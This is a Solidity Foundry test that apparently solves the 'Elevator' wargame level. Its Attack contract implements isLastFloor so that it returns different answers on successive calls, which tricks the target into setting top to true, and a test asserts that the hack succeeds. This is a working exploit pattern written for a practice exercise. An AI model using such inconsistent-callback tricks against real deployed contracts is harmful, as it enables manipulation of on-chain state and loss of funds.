// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "src/Elevator.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";


contract ElevatorTest is Test {
    Elevator private elevator;
    Attack private att;
     
    address private constant HACKER = address(0x1);

    function setUp() external {
        vm.deal(HACKER, 6e18);
        elevator = new Elevator();
        att = new Attack();
    }

    function testHack() external {
       vm.startPrank(HACKER);
       att.attack(address(elevator));
       assertEq(elevator.top(), true);
       vm.stopPrank();
    }
}

contract Attack is Building{
    Elevator private elevator;
    uint counter;
    function isLastFloor(uint floor) external returns (bool){
        bool res = counter == 1? true: false;
        ++counter;
        return res; 
    }

    function attack(address victim) external {
        elevator = Elevator(victim);
        elevator.goTo(2);
    }

}